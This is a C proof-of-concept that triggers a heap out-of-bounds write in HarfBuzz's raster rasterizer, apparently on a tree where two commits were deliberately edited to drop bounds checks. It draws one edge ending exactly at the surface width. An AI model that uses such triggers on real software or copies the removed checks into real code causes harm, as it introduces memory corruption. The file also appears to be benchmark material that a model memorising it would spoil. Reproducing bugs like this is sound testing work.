/* PoC for a delocalized out-of-bounds write in the HarfBuzz raster
 * rasterizer, reachable through the public hb-raster / hb-draw API.
 *
 * Builds a 16x16 A8 surface with an explicit output window and feeds a
 * single near-horizontal outline edge whose right endpoint lands exactly
 * one pixel column past the surface's right edge (column index == width).
 *
 * On the resulting (edited) tree:
 *   - commit #6251 drops the per-column window guard on the final boundary
 *     cell and relies on cell_add() to clamp it, and
 *   - commit #6273 drops cell_add()'s right-of-surface bound check and
 *     relies on the sweep's window clipping to keep col < width.
 * Neither assumption holds once both land, so the final cell writes
 * row_area[width] / row_cover[width], one element past the per-row scratch
 * buffers (sized exactly `width`) -> AddressSanitizer heap-buffer-overflow.
 *
 * On the original batch (and on either commit edited alone) the write is
 * clamped away and rendering completes normally.
 */

#include <hb.h>
#include <hb-raster.h>

int main (void)
{
  hb_raster_draw_t *draw = hb_raster_draw_create_or_fail ();
  if (!draw)
    return 2;

  /* x_origin, y_origin, width, height, stride (0 = auto). */
  hb_raster_extents_t ext = { 0, 0, 16, 16, 0 };
  hb_raster_draw_set_extents (draw, &ext);

  hb_draw_funcs_t *funcs = hb_raster_draw_get_funcs (draw);
  hb_draw_state_t st = HB_DRAW_STATE_DEFAULT;

  /* Edge from column 2 (inside) to column 16 (== width, one past the
   * right edge) within the first pixel row: a left-to-right edge that
   * exits the surface on the right. */
  hb_draw_move_to (funcs, draw, &st, 2.0f, 0.0f);
  hb_draw_line_to (funcs, draw, &st, 16.0f, 1.0f);
  hb_draw_close_path (funcs, draw, &st);

  hb_raster_image_t *img = hb_raster_draw_render (draw);

  hb_raster_image_destroy (img);
  hb_raster_draw_destroy (draw);
  return 0;
}
